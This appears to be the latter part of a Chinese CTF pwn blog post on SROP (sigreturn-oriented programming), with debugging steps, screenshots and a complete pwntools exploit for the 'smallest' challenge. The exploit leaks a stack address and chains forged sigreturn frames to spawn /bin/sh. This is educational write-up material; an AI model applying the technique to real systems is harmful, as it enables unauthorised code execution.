+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-v&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./smallest&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s1">&#39;b *0x4000be; continue&#39;</span><span class="p">)</span>   <span class="c1"># 下断点</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">start_addr</span> <span class="o">=</span> <span class="mh">0x4000b0</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_addr</span> <span class="o">=</span> <span class="mh">0x4000be</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dbg</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dbg</span><span class="p">()</span>  <span class="c1"># 查看栈数据</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/srop/srop4.png"
+	width="1816"
+	height="709"
+	srcset="/p/srop/srop4_hu11123961283877126402.png 480w, /p/srop/srop4_hu9857155095542794554.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="614px"
+	
+></p>
+<p><strong><code>gdb.attach(io, 'b *0x4000be; continue')</code>中需要下断点的原因</strong></p>
+<p>库函数本质上是对系统调用的多层封装，库函数的实现本身就调用了其它很多函数进行<strong>中断</strong>等待输入；在反汇编的代码中只有syscall，直接使用syscall 进行系统调用时，程序会进入内核态，执行系统调用。<strong>这个过程通常是同步的，不涉及中断。</strong></p>
+<p><strong><code>write(1, buf,0x400)</code>泄露栈地址</strong></p>
+<p><img src="/p/srop/srop5.png"
+	width="1437"
+	height="665"
+	srcset="/p/srop/srop5_hu9369850888390525794.png 480w, /p/srop/srop5_hu3074932312609852743.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p><strong>sigreturnFrame写入栈</strong></p>
+<p><img src="/p/srop/srop6.png"
+	width="1739"
+	height="608"
+	srcset="/p/srop/srop6_hu7122175868410511941.png 480w, /p/srop/srop6_hu4174130528025839122.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="686px"
+	
+></p>
+<p><strong>触发sigreturn调用<code>read(0,leak_stack_addr,0x400)</code>，再把execve的sigreturn写入栈</strong></p>
+<p><img src="/p/srop/srop7.png"
+	width="1699"
+	height="691"
+	srcset="/p/srop/srop7_hu9580036749220073539.png 480w, /p/srop/srop7_hu14064774636203513349.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="590px"
+	
+></p>
+<p><strong>再次输入15字节getshell</strong></p>
+<p><img src="/p/srop/srop8.png"
+	width="1536"
+	height="354"
+	srcset="/p/srop/srop8_hu9970237132218726197.png 480w, /p/srop/srop8_hu2161405949312950029.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="433"
+		data-flex-basis="1041px"
+	
+></p>
+<h3 id="整体流程">整体流程
+</h3><p><strong>read(0,buf,0x400) &ndash;&gt; write(1,buf,0x400) &ndash;&gt; sigreturn &ndash;&gt; read(0,leak_stack_addr,0x400) &ndash;&gt; sigreturn &ndash;&gt; execve(&quot;/bin/sh&quot;,0,0)</strong></p>
+<h3 id="exp">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-v&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./smallest&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">start_addr</span> <span class="o">=</span> <span class="mh">0x4000b0</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_addr</span> <span class="o">=</span> <span class="mh">0x4000be</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xb3</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># 0x4000b3 mov edx,0x400 =&gt; rax = 1 =&gt; write(1,buf,0x400)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak_stack_addr:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_stack_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 返回到syscall_addr调用read(0,buf,0x400)</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>  <span class="c1"># 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">leak_stack_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x400</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">leak_stack_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 15 bytes =&gt; rax = 15 =&gt; sigreturn</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x7</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 返回到syscall_addr调用execve(&#34;/bin/sh&#34;,0,0)</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>  <span class="c1"># 59</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">leak_stack_addr</span> <span class="o">+</span> <span class="mh">0x108</span> <span class="c1"># /bin/sh的偏移</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">leak_stack_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">execve</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>  <span class="c1"># /bin/sh写入栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 15 bytes =&gt; rax = 15 =&gt; sigreturn</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x7</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="参考">参考
+</h2><p><a class="link" href="https://ephemerally.top/post/9"  target="_blank" rel="noopener"
+    >SROP基本原理 | Ephemeral1yのBlog | CTF学习笔记 (ephemerally.top)</a></p>
+<p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/"  target="_blank" rel="noopener"
+    >SROP - CTF Wiki (ctf-wiki.org)</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%A0%88/">栈</a>
+        
+            <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>
+        
+            <a href="/tags/rop/">ROP</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/ret2csu/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ret2csu</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">栈迁移</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/pie-bypass/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Pie Bypass</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ret2libc/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ret2libc</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ret2text/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ret2text</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 Pwn3r4llD4ys
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
